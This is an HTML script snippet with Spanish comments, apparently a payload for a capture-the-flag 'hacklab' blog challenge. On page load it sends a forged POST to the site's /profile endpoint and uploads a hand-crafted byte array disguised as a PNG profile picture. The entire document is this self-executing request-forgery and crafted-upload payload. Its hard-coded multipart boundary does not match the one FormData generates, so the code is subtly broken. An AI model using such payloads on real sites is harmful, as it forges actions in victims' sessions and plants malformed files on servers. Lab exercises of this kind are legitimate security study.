<script>
  // Función para realizar la solicitud POST y enviar la imagen
  function sendProfilePic() {
    const url = "https://chl-bcad4749-ab21-433e-96c3-7f1f1d202ba3-blog-hacklab.softwareseguro.com.ar/profile";
    
    const formData = new FormData();
    formData.append("bio", "None");  // Campo "bio" (puedes ajustarlo si es necesario)
    
    // Crear un Blob con el contenido binario de la imagen PNG
    const pngBytes = new Uint8Array([
      137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 0, 16, 
      0, 0, 0, 16, 8, 6, 0, 0, 0, 106, 139, 190, 60, 0, 0, 0, 4, 67, 76, 85, 
      65, 84, 0, 0, 0, 19, 116, 69, 88, 73, 84, 101, 120, 116, 0, 0, 0, 19, 
      73, 68, 65, 84, 120, 218, 99, 96, 96, 96, 96, 96, 96, 48, 96, 96, 48, 
      48, 80, 96, 32, 32, 32, 32, 48, 64, 64, 64, 64, 32, 32, 32, 32, 96, 
      96, 96, 96, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130
    ]);
    
    const blob = new Blob([pngBytes], { type: "image/png" });
    formData.append("profile_pic", blob, "foto.png");

    // Enviar la solicitud POST con la cookie de sesión vacía
    fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "multipart/form-data; boundary=---------------------------2683243392974339614127727464",
      },
      body: formData
    })
    .then(response => response.text())
    .then(data => {
      console.log('Respuesta:', data);
    })
    .catch(error => {
      console.error('Error:', error);
    });
  }

  // Llamar a la función para ejecutar el script
  sendProfilePic();
</script>

